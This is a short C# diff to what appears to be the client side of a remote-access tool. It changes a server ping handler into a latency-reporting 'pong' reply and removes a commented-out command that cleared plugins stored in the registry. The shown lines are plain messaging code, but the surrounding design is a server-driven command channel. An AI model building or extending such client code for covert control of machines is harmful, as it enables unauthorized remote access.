@@ -25,9 +25,13 @@ namespace Client.Handle_Packet
                 unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
-                    case "Ping":
+                    case "pong":
                         {
-                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
+                            ClientSocket.Pong.Stop();
+                            MsgPack msgPack = new MsgPack();
+                            msgPack.ForcePathObject("Packet").SetAsString("pong");
+                            msgPack.ForcePathObject("Message").SetAsInteger(ClientSocket.Pong.ElapsedMilliseconds);
+                            ClientSocket.Send(msgPack.Encode2Bytes());
                             break;
                         }
 
@@ -68,15 +72,6 @@ namespace Client.Handle_Packet
                             }
                             break;
                         }
-
-                    //case "cleanPlugin": // server want to clean and re save all plugins
-                    //    {
-                    //        SetRegistry.DeleteSubKey();
-                    //        MsgPack msgPack = new MsgPack();
-                    //        msgPack.ForcePathObject("Packet").SetAsString("sendPlugin+");
-                    //        ClientSocket.Send(msgPack.Encode2Bytes());
-                    //        break;
-                    //    }
                 }
             }
             catch (Exception ex)
